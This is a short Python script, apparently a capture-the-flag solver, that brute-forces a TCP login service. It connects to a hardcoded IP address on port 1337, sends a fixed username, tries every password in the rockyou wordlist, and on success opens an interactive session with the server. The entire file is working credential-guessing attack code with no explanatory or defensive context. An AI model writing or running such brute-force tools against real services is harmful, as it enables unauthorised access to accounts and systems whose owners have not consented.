import socket
import string
host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
user = "v0idcache\n"

def brute_force():
	words = open(wordlist,"r")	
	for word in words:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		s.connect((host, port))
		word = word.strip() + "\n" 
		uname = s.recv(1024).decode()	
		s.send(user.encode())
		pw = s.recv(1024).decode()	
		s.send(word.encode())
		resp = s.recv(1024).decode().strip()
		if resp != "Fail":
			while(1):
				resp = s.recv(1024).decode()
				print(resp)
				ans = input()
				ans = ans + "\n"
				s.sendall(ans.encode())
				resp = s.recv(5000).decode()
				print(resp)
		s.close()	
		
		
if __name__ == '__main__':
	brute_force()
